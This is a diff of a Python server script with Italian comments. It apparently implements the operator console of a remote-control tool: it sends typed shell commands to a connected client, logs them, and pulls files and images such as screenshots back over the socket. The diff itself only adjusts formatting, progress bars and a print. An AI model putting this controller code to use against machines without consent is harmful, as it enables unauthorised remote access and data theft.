@@ -56,32 +56,33 @@ def filespath(clientConnection):
         print("Command Filespath gone wrong\n")
 
 
+
 # CONTROLLO REMOTO
 def remoteControl(clientConnection,buff):
     while True:
         try:
-            pathError=""
-            if buff[0:6]=="[PATH]":
-                pathError=buff
-                buff=""
+            pathError = ""
+            if buff[0:6] == "[PATH]":
+                pathError = buff
+                buff = ""
             else:
                 pathError = clientConnection.recv(1024).decode(FORMAT)
 
-            if pathError[0:7]=="[ERROR]":
-                path=clientConnection.recv(1024).decode(FORMAT)
-                print(path+"$ "+pathError)
+            if pathError[0:7] == "[ERROR]":
+                path = clientConnection.recv(1024).decode(FORMAT)
+                print(path + "$ " + pathError)
             else:
-                while pathError[0:6]!="[PATH]":
-                    pathError=pathError[1:]
+                while pathError[0:6] != "[PATH]":
+                    pathError = pathError[1:]
 
-                path=pathError[6:]
+                path = pathError[6:]
 
             comando = input(path + "$ ")
             while comando == "":
                 comando = input(path + "$ ")
 
             global fileLog
-            fileLog=fileLog+"\n"+path + "$ "+comando+"\n"
+            fileLog = fileLog + "\n" + path + "$ " + comando + "\n"
 
             clientConnection.send((comando).encode(FORMAT))
 
@@ -89,7 +90,6 @@ def remoteControl(clientConnection,buff):
                 print(f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n")
                 fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n" + "\n"
                 break
-
 
             elif comando[0:2] == "ls":
                 match= regexcheck_ls(comando)
@@ -166,7 +166,7 @@ def remoteControl(clientConnection,buff):
                     nomeFile=comando[10:len(comando) - 1]
                     file = open(nomeFile, 'wb')
                     for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading {nomeFile}...", colour="green",
-                                  ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                                  ncols=100, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                         sleep(0.2)
 
                     filerecv = clientConnection.recv(1024)
@@ -226,8 +226,8 @@ def remoteControl(clientConnection,buff):
 
                 try:
                     file = open(nomeFoto, 'wb')
-                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + "Downloading the .png file...", colour="green",
-                                  ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading the {nomeFoto} file...", colour="green",
+                                  ncols=75, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                         sleep(0.2)
 
                     filerecv=clientConnection.recv(1024)
@@ -242,6 +242,7 @@ def remoteControl(clientConnection,buff):
                             scritti = scritti + file.write(filerecv)
                             filerecv = clientConnection.recv(1024)
                             if filerecv == b'[END]':
+                                print(filerecv.decode(FORMAT))
                                 filerecv=''
 
                         file.close()
